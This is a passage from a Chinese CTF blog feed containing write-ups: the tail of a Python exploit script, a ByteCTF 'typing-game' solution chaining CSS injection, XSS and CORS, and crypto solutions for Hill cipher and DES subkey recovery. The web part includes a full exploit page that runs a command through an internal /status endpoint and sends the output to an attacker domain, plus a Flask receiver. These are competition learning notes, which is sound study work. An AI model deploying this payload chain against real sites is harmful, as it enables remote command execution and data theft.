   cookies = cookies,<br>                        json = data,<br>                        verify = <span class="hljs-literal">False</span>,<br>                        proxies=&#123;<br>                            <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>                        &#125;<br>            )<br><span class="hljs-built_in">print</span>(response.text)<br><br><span class="hljs-comment"># run npm install</span><br>response = requests.post(url=url+route3,<br>                        cookies = cookies,<br>                        verify = <span class="hljs-literal">False</span>,<br>                        proxies=&#123;<br>                            <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>                        &#125;<br>            )<br><span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-comment"># read the file</span><br>filepath = <span class="hljs-string">&quot;/app/public/uploads/c.txt&quot;</span><br>response = requests.get(url = url + filepath,<br>                        cookies = cookies,<br>                        )<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h4 id="我的总结-1">我的总结</h4><p>比赛时，我主要是发现SQL注入点，但是当时没有第一时间反应过来插入admin这个数据，这样的攻击其实在NepCTF的时候已经遇到过了，当时是利用不可见字符<code>%c2</code>构造新的admin用户。漏洞形成的主要原因还是'admin'不是主键，却充当身份校验值。</p><p>剩下的部分tan大师直接速通了，我是赛后才复盘。</p><p>主要还是我对npm和node.js项目部署的不熟悉，字节的前端还糊弄，搞得我不知道要从何下手，只能说以后慢慢积累经验了。</p><h3 id="typing-game">typing-game</h3><h4 id="解题复盘-2">解题复盘</h4><p>这道题的两个知识点，CSS注入和CORS我之前都有遇到过，但是比赛的时候结合起来的就意识不到了。</p><p>页面点击进去之后，是一个打字游戏。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145240477.png" alt="image-20220930145240477" /></p><p>很明显要输入的单词就是#embed 的mp3文件对应的名字。</p><p>简单打打游戏，基本是过不了关的，于是回头查看源代码。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145402655.png" alt="image-20220930145402655" /></p><p>源代码中，显示color属性是可控的，因此考虑是不是CSS注入，从而泄露src中的内容，实现游戏的过关。</p><p>还有两个路由：</p><ol type="1"><li><code>/status</code>可以实现无回显的短命令执行，但是要求内网访问</li><li><code>/report</code>可以实现对外网资源的访问，可以实现XSS/CSRF</li></ol><p>简单的XSS利用思路是：</p><ol type="1"><li><code>report</code>利用<code>url</code>让victim访问hacker的VPS</li><li>在VPS中引入<code>127.0.0.1/status</code></li><li>跨域读取页面中的内容，类似的赛题有GKCTF checkbot</li></ol><p>这样的方法有关键在于开了跨域，如果没开的话，那么受同源策略限制是无法做到的。</p><p>分享一篇同源策略讲得非常清楚的博客：https://www.cnblogs.com/bmjoker/p/9500374.html</p><p>在这道题中，我们要实现让victim主动访问<code>/status</code>路由，这需要XSS的实现，刚好存在name参数可以XSS。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171917479.png" alt="image-20220930171917479" /></p><p>问题转移到如何实现解题（手动显然不可行</p><p>我们尝试闭合CSS，利用CSS注入泄露HTML页面内容实现在hacker端获取到答案</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930170938596.png" alt="image-20220930170938596" /></p><p>这样拼接我们能在hacker端获取到对应页面的src值的内容，并且可以通过向hacker端发送请求实现src值的获取。</p><p>接下来实现自动化答题，回归到源代码，我们查看源代码发现存在两种答题模式</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171127025.png" alt="image-20220930171127025" /></p><p>于是单次答题的攻击链如下：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">CSS注入泄露<span class="hljs-function"><span class="hljs-title">src</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">hacker</span>端接收到对应src -&gt;</span> <span class="hljs-function"><span class="hljs-title">victim</span>端访问hacker端得到src -&gt;</span> 拼接location.href 答题<br></code></pre></td></tr></table></figure><p>当我们解决了所有问题之后，接下来我们就可以利用name的XSS注入了,<code>after_command</code>就是访问<code>/status</code></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171356476.png" alt="image-20220930171356476" /></p><p>注意到，此时是victim端访问<code>/status</code>，所以通过内网检查。</p><p>victim端获取到HTML内容，接下来就是发送，这当然也涉及跨域，但是此时注意到hacker端就是响应端了，主动权在hacker端，只要设置响应头就可以了。</p><p>最后在hacker端接受传送过来的<code>/status</code>的结果就可以了。</p><p>hacker端需要部署两个web服务，一个是<code>report</code>访问实现自动化做题，一个是实现接收src和最后的rce结果。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    prevent page recycle<br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://deelay.me/50000/https://picsum.photos/200/300&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-keyword">let</span> after_command =</span><br><span class="javascript">        <span class="hljs-built_in">encodeURIComponent</span>(</span><br><span class="javascript">            <span class="hljs-string">`fetch(&#x27;http://127.0.0.1:13002/status?cmd=env&#x27;).then(r=&gt;r.text().then(t=&gt;fetch(&#x27;https://www.hackerdomain.com/ctftest/setword/&#x27;+encodeURIComponent(t))));`</span></span><br><span class="javascript">        );</span><br><span class="javascript">    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.location.href.indexOf(<span class="hljs-string">&quot;www.hackerdomain.com&quot;</span>) == -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//local testing</span></span><br><span class="javascript">        <span class="hljs-keyword">var</span> server = <span class="hljs-string">&quot;https://a71f2c55a775f55f23d7ccaf62f36fe0.2022.capturetheflag.fun&quot;</span></span><br><span class="javascript">    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//打远程</span></span><br><span class="javascript">        <span class="hljs-keyword">var</span> server = <span class="hljs-string">&quot;http://127.0.0.1:13002&quot;</span></span><br><span class="javascript">    &#125;</span><br><span class="javascript">    <span class="hljs-keyword">let</span> base_url = server + <span class="hljs-string">&quot;/?color=red;&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=web]&#123;background-image:url(https://www.hackerdomain.com/ctftest/setword/web);&#125;&quot;</span> + </span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=bytedance]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/bytedance);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=ctf]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/ctf);&#125;&quot;</span> +</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=sing]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/sing);&#125;&quot;</span> +</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=jump]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/jump);&#125;&quot;</span> + </span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=rap]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/rap);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=basketball]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/basketball);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=hello]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/hello);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=world]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/world);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=fighting]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/fighting);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=flag]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/flag);&#125;&quot;</span> + </span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=game]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/game);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=happy]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/happy);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;x&#123;&quot;</span> + </span><br><span class="javascript">                            <span class="hljs-string">&quot;&amp;name=&lt;img src=x onerror=\&quot;fetch(&#x27;https://www.hackerdomain.com/ctftest/setword/xss_done&#x27;);&quot;</span> + after_command + <span class="hljs-string">&quot;\&quot; /&gt;#&quot;</span></span><br><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_window</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> w = open(base_url)</span><br><span class="javascript">        <span class="hljs-keyword">return</span> w</span><br><span class="javascript"></span><br><span class="javascript">    &#125;</span><br><span class="javascript">    ended = <span class="hljs-literal">false</span></span><br><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_word</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">if</span> (ended) &#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span></span><br><span class="javascript">        &#125;</span><br><span class="javascript">        <span class="hljs-comment">//获取到当前答案</span></span><br><span class="javascript">        fetch(<span class="hljs-string">&quot;https://www.hackerdomain.com/ctftest/getword&quot;</span>).then(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.text().then(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> &#123;</span><br><span class="javascript">            <span class="hljs-keyword">if</span> (x == <span class="hljs-string">&quot;xss_done&quot;</span>) &#123;</span><br><span class="javascript">                ended = <span class="hljs-literal">true</span></span><br><span class="javascript">                <span class="hljs-keyword">return</span></span><br><span class="javascript">            &#125;</span><br><span class="javascript">            <span class="hljs-keyword">if</span> (x == <span class="hljs-string">&quot;&quot;</span>) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">return</span>;</span><br><span class="javascript">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">                <span class="hljs-comment">//修改href,提交答案</span></span><br><span class="javascript">                <span class="hljs-built_in">window</span>.vuln_window.location.href = base_url + x;</span><br><span class="javascript">            &#125;</span><br><span class="javascript">        &#125;));</span><br><span class="javascript">    &#125;</span><br><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-comment">//clear old word</span></span><br><span class="javascript">        fetch(<span class="hljs-string">&quot;https://www.hackerdomain.com/ctftest/getword&quot;</span>)</span><br><span class="javascript">        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-comment">// 创建窗口，自动化解题</span></span><br><span class="javascript">            <span class="hljs-built_in">window</span>.vuln_window = create_window()</span><br><span class="javascript">            <span class="hljs-built_in">setInterval</span>(get_word, <span class="hljs-number">500</span>);</span><br><span class="javascript">        &#125;, <span class="hljs-number">500</span>);</span><br><span class="javascript">        <span class="hljs-comment">//prevent window being recycled</span></span><br><span class="javascript">        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)</span><br><span class="javascript">        &#125;, <span class="hljs-number">1000</span>)</span><br><span class="javascript">        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)</span><br><span class="javascript">        &#125;, <span class="hljs-number">10000</span>)</span><br><span class="javascript">        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)</span><br><span class="javascript">        &#125;, <span class="hljs-number">20000</span>)</span><br><span class="javascript"></span><br><span class="javascript">    &#125;</span><br><span class="javascript">    main()</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,abort<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.after_request</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">after_request</span>(<span class="hljs-params">response</span>):</span><br>  response.headers.add(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br>  response.headers.add(<span class="hljs-string">&#x27;Access-Control-Allow-Headers&#x27;</span>, <span class="hljs-string">&#x27;Content-Type,Authorization&#x27;</span>)<br>  response.headers.add(<span class="hljs-string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="hljs-string">&#x27;GET,PUT,POST,DELETE,OPTIONS&#x27;</span>)<br>  <span class="hljs-keyword">return</span> response<br><br>word = <span class="hljs-literal">None</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/ctftest/setword/&lt;lword&gt;&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>(<span class="hljs-params">lword</span>):</span><br>    <span class="hljs-keyword">global</span> word<br>    word = lword<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;word is&quot;</span>,word)<br>    abort(<span class="hljs-number">404</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/ctftest/getword&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getword</span>():</span><br>    <span class="hljs-keyword">global</span> word<br>    <span class="hljs-keyword">if</span> word <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    lword = word<br>    word = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> lword<br><br><span class="hljs-comment"># 建议部署https</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,port=<span class="hljs-number">7099</span>)<br></code></pre></td></tr></table></figure><h4 id="我的总结-2">我的总结</h4><p>这道题赛后分析看起来还是思路比较清楚的，但是要求的水平还是比较高的。这也是第一次复盘这么复杂的题目，整体的手段环环相扣，重点还是利用同源策略分析出要从name处实现XSS，然后再利用CSS注入实现自动化做题。</p><p>还是分析的能力偏弱，同时XSS也是我的薄弱项，中间花了不少时间去学习同源策略，但是学习到了非常多。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>Games</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>ByteCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF-Crypto-wp</title>
    <link href="/2022/09/16/blog0024-NSSCTF-Crypto-wp/"/>
    <url>/2022/09/16/blog0024-NSSCTF-Crypto-wp/</url>
    
    <content type="html"><![CDATA[<p>开启新的篇章，密码学是一直感兴趣的部分，希望不要被折磨得太惨</p><span id="more"></span><h2 id="classical">1、Classical</h2><h3 id="uctf-hill">1、UCTF-Hill</h3><p>这道题打开是一段字母串，结合题目猜测是希尔密码<br /><span class="math display">\[\begin{align}Am &amp;= c\\m  &amp;= A^{-1}c\end{align}\]</span><br />猜测n = 2，于是爆破<span class="math inline">\(A^{-1}\)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alpha_to_num</span>(<span class="hljs-params">a</span>):</span><br>    <span class="hljs-keyword">if</span> a.islower():<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(a)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(a)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">num_to_alpha</span>(<span class="hljs-params">num</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + num)<br><br><span class="hljs-comment"># 此处根据n的大小修改</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">collsion_one_row</span>(<span class="hljs-params">m,c,key,row</span>):</span><br>    <span class="hljs-keyword">for</span> x1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>        <span class="hljs-keyword">for</span> x2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>            <span class="hljs-keyword">if</span>(<br>                (x1 * c[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + x2 * c[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) % <span class="hljs-number">26</span> == m[row][<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span><br>                (x1 * c[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] + x2 * c[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) % <span class="hljs-number">26</span> == m[row][<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span><br>                (x1 * c[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] + x2 * c[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]) % <span class="hljs-number">26</span> == m[row][<span class="hljs-number">2</span>]<br>            ):<br>                key[row][<span class="hljs-number">0</span>] = x1<br>                key[row][<span class="hljs-number">1</span>] = x2 <br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">collsion_key</span>(<span class="hljs-params">m,c,n,key</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        collsion_one_row(m,c,key,i)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">c,n,key</span>):</span><br>    plain = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(c),n):<br>        ci = np.mat([alpha_to_num(c[i]),alpha_to_num(c[i+<span class="hljs-number">1</span>])]).reshape(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>        m = np.matmul(key,ci) % <span class="hljs-number">26</span><br>        plain += num_to_alpha(<span class="hljs-built_in">int</span>(m[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]))<br>        plain += num_to_alpha(<span class="hljs-built_in">int</span>(m[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]))<br>    <span class="hljs-keyword">return</span> plain<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hill_decrypt</span>(<span class="hljs-params">patr_m,cipher</span>):</span><br>    n = <span class="hljs-number">2</span><br><br>    <span class="hljs-comment"># n 为 ncipher的公因数 2,3,4,6,8,12</span><br>    m = np.zeros(<span class="hljs-built_in">len</span>(plain),dtype=<span class="hljs-built_in">int</span>)<br>    c = np.zeros(<span class="hljs-built_in">len</span>(plain),dtype=<span class="hljs-built_in">int</span>)<br><br>    <span class="hljs-comment"># 转换爆破矩阵</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plain)):<br>        m[i] = alpha_to_num(plain[i])<br>        c[i] = alpha_to_num(cipher[i])<br>    m = m.reshape(<span class="hljs-built_in">len</span>(plain)//n,n).T<br>    c = c.reshape(<span class="hljs-built_in">len</span>(plain)//n,n).T<br><br>    key = np.zeros(n*n,dtype=<span class="hljs-built_in">int</span>).reshape(n,n)<br><br>    <span class="hljs-comment"># 爆破密钥</span><br>    collsion_key(m,c,n,key)<br><br>    <span class="hljs-comment"># 解密</span><br>    <span class="hljs-keyword">return</span> decrypt(cipher,n,key)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:          <br>    cipher = <span class="hljs-string">&quot;wznqca&#123;d4uqop0fk_q1nwofDbzg_eu&#125;&quot;</span><br>    ncipher = <span class="hljs-string">&quot;&quot;</span><br>    l = []<br>    <span class="hljs-keyword">for</span> idx,i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(cipher):<br>        <span class="hljs-keyword">if</span>(i.isalpha()):<br>            ncipher += i<br>        <span class="hljs-keyword">else</span>:<br>            l.append(idx)<br>    plain = <span class="hljs-string">&quot;utflag&quot;</span><br>    <span class="hljs-built_in">print</span>(hill_decrypt(plain,ncipher))<br></code></pre></td></tr></table></figure><h2 id="des">2、DES</h2><h3 id="nctf-reverse子密钥逆推">1、NCTF-Reverse（子密钥逆推）</h3><p>加密部分非常简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pyDes<br>flag = <span class="hljs-string">&quot;NCTF&#123;******************************************&#125;&quot;</span><br>key = os.urandom(<span class="hljs-number">8</span>)<br>d = pyDes.des(key)<br>cipher = d.encrypt(flag.encode())<br><span class="hljs-built_in">print</span>(d.Kn[<span class="hljs-number">10</span>])<br></code></pre></td></tr></table></figure><p>这里给第10轮的密钥，结合密钥生成的过程，我们可以得到如下的逆推逻辑：<br /><span class="math display">\[\begin{align}逆PC2置换(48bit \rightarrow 56bit) \nonumber \\逆推位移运算 \nonumber \\得到带8位未知数的56bit初始密钥 \nonumber \\\end{align}\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_subkey</span>(<span class="hljs-params">key</span>):</span><br>    kbits = str_to_bits(key)<br>    kbits = [kbits[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_1]<br>    left = kbits[:<span class="hljs-number">28</span>]<br>    right = kbits[<span class="hljs-number">28</span>:]<br>    subkeys = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROUNDS):<br>        left = left[R[i]:]+left[:R[i]]<br>        right = right[R[i]:]+right[:R[i]]<br>        cur = left+right<br>        subkeys.append([cur[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_2])<br>    <span class="hljs-keyword">if</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Boom&quot;</span>)<br>    <span class="hljs-keyword">return</span> subkeys<br></code></pre></td></tr></table></figure><p>对着8位bit做全排列，一共也只有<span class="math 